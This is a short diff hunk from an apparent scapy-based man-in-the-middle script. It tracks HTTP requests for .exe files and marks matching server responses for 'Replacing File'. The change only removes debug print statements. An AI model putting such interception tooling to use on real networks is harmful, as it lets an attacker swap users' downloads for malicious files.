@@ -16,14 +16,14 @@ def process_packet(packet):
                 print("[+] .exe Request")
 #append(add) ack field of each captured packet to the ack_list above
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+
 #check packets source port for 80 (http)
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
 #remove seq field from each captured packet once it has been processed
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
-                print(scapy_packet.show())
+
 
     packet.accept()
 
